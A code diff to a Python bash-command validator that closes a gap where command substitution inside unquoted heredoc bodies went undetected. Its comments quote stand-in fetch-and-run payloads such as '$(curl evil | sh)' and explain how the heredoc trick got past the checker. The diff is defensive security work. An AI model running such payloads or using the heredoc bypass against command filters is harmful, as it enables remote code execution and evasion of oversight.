@@ -39,6 +39,27 @@ MAX_SUBSTITUTION_DEPTH = 10
 # expansion body is worth re-parsing (see _substitutions_in_parameter).
 _SUBSTITUTION_INTRODUCERS: tuple[str, ...] = ("$(", "`", "<(", ">(")
 
+# The same question for an UNQUOTED heredoc body, which bash expands as if it were a
+# double-quoted string: command substitution fires, process substitution does NOT.
+# `cat <<EOF` / `<(echo X)` / `EOF` prints the text verbatim (verified against bash), so
+# carrying <( / >( over from the set above would deny a body bash never executes - a pure
+# false positive with no attack behind it. See _substitutions_in_heredoc.
+_HEREDOC_SUBSTITUTION_INTRODUCERS: tuple[str, ...] = ("$(", "`")
+
+
+def _as_double_quoted(body: str) -> str:
+    """Re-spell a heredoc body as the inside of a double-quoted string.
+
+    The two contexts share every escape (``\\$``, ``\\```, ``\\\\``, ``\\<newline>``) but one:
+    ``"`` is ordinary text in a heredoc body and a terminator inside double quotes. So
+    escape each ``"``, and double the backslash run in front of it first - otherwise a
+    body's literal ``\\"`` would close the wrapper and the parse would fail closed on
+    everyday content (JSON with escaped quotes). Everything else is passed through
+    untouched, which is what keeps ``\\$(x)`` non-expanding in both.
+    """
+    return re.sub(r'(\\*)"', lambda m: m.group(1) * 2 + r"\"", body)
+
+
 # Operators bashlex emits in a command-list node's parts. A well-formed list strictly alternates
 # segment/operator and ends on a segment; anything else is a malformed AST -> fail closed.
 _LIST_OPERATORS: frozenset[str] = frozenset({"&&", "||", ";", "&"})
@@ -846,6 +867,11 @@ class SubstitutionValidator:
                 substitutions.extend(self._substitutions_in_parameter(node, current_depth))
                 return
 
+            if node.kind == "redirect":
+                # No `return`: a redirect carries no other attribute this walk reads today,
+                # but a future bashlex could hang one off it, and skipping it would fail OPEN.
+                substitutions.extend(self._substitutions_in_heredoc(getattr(node, "heredoc", None), current_depth))
+
             # Recurse into child nodes
             for attr in ["parts", "command", "list", "pipe", "compound"]:
                 if hasattr(node, attr):
@@ -929,6 +955,91 @@ class SubstitutionValidator:
             SubstitutionNode(
                 substitution_type=SubstitutionType.COMMAND,
                 inner_command=value,
+                base_command=None,
+                ast_node=node,
+                nested_substitutions=[],
+                depth=depth,
+            )
+        ]
+
+    def _substitutions_in_heredoc(self, node: Any, depth: int) -> list[SubstitutionNode]:
+        r"""Extract substitutions written inside an unquoted-delimiter heredoc body.
+
+        SECURITY (LAB-2756): ``HeredocNode`` carries its body as unparsed text on ``.value``
+        and hangs off ``RedirectNode.heredoc``, which the walk above never visited. A
+        ``$( )`` in the body was therefore invisible to Layer 4, while bash expands it
+        before the receiving command ever sees the text -- so ``cat <<EOF`` /
+        ``$(curl evil | sh)`` / ``EOF`` executed and scored ALLOWED/SAFE. Same structural
+        class as LAB-1731's ``${...}`` hole, different node.
+
+        WHY THE DELIMITER GATE IS FREE. Only an unquoted delimiter expands; ``<<'EOF'`` is
+        literal and denying it would be a pure false positive. We never have to ask: stock
+        bashlex cannot parse a quoted delimiter at all (it matches the terminator against
+        the raw delimiter text, quotes included, and raises ParsingError), so reaching this
+        node at all proves the delimiter was unquoted. That is bashlex's accident, not a
+        contract, so test_heredoc_substitution pins it -- if a future bashlex starts parsing
+        ``<<'EOF'``, that test fails rather than this code silently over-blocking.
+
+        THE RE-PARSE IS THE DANGEROUS PART, exactly as in _substitutions_in_parameter: the
+        body's real lexical context is not a command line. POSIX says an unquoted heredoc
+        body is treated as a DOUBLE-QUOTED STRING, so that is what we hand bashlex --
+        ``echo "<body>"`` -- rather than the body as bare source. That one wrapper is the
+        whole fix, and it buys three things a naive re-parse does not have:
+
+        1. ``#`` is literal inside double quotes, as it is in a heredoc body. LAB-1731 had
+           to blank ``#`` because a bare re-parse read the rest of the body as a comment and
+           reported ``$(date) # $(curl evil|sh)`` clean while bash ran it. Here the trap
+           never opens, so there is no mangling to get wrong.
+        2. Prose stays prose. ``Built at $(date). Don't forget.`` is a MatchedPairError to a
+           bare re-parse -- which, fail-closed, would deny an everyday ``cat <<EOF > notes``.
+           Quoted, the apostrophe is just text.
+        3. The escapes agree with bash where it matters. ``\$(x)`` and ``$$(x)`` expand in
+           neither model; ``# $(x)``, ``it's $(x)``, ``$(x) > y`` and ``${z:-$(x)}`` expand
+           in both. All eight verified against real bash, not reasoned about.
+
+        Trap 2 from the LAB-1731 panel still applies and still holds: an introducer we saw
+        but could not decode is DENIED, not dropped -- whether the parse raised or came back
+        empty. An attacker seeding a whitelisted ``$(date)`` first must not convert "we
+        decoded at least one" into "we decoded them all".
+
+        Node positions in the returned subtree are relative to the wrapper, not to the outer
+        command. Nothing on the validation path reads them; do NOT wire ``_find_outer_command``
+        into this path.
+
+        Cost (measured): ~2us for a heredoc with no introducer, which is every everyday shape
+        -- config files, commit bodies, plain text. A body that does carry one re-parses, at
+        ~170us for a single line and ~75us per line after that (400 lines -> 31ms), linear.
+        Deliberately uncapped: a size cap that skipped validation would fail OPEN on exactly
+        the payload this function exists to catch, and one that denied would be a worse cliff
+        than the latency.
+        """
+        value = getattr(node, "value", None)
+        if not isinstance(value, str):
+            return []
+
+        # bashlex's value is the body followed by its terminator line (same shape
+        # BashCommandParser._close_heredocs relies on). Model the body bash expands, nothing else.
+        body, _, _ = value.rpartition("\n")
+        if not any(intro in body for intro in _HEREDOC_SUBSTITUTION_INTRODUCERS):
+            return []
+
+        if depth < MAX_SUBSTITUTION_DEPTH:
+            try:
+                inner_ast = self.parser.parse(f'echo "{_as_double_quoted(body)}"')
+            except Exception as exc:  # noqa: BLE001 - any decode failure is treated as suspicious
+                logger.debug("Unparseable heredoc body %r: %s", body, exc)
+            else:
+                # A SUCCESSFUL parse that found nothing is a finding, not a refusal: bashlex
+                # just applied the same double-quote lexer bash applies to this body. Denying
+                # it anyway would block the canonical literal-dollar idiom (`echo \\$(date)`
+                # inside a heredoc that writes a shell script) for no attacker. The refusal
+                # case - the one LAB-1731's trap 2 is about - is the parse failure below.
+                return self.extract_substitutions(inner_ast, depth + 1)
+
+        return [
+            SubstitutionNode(
+                substitution_type=SubstitutionType.COMMAND,
+                inner_command=body,
                 base_command=None,
                 ast_node=node,
                 nested_substitutions=[],
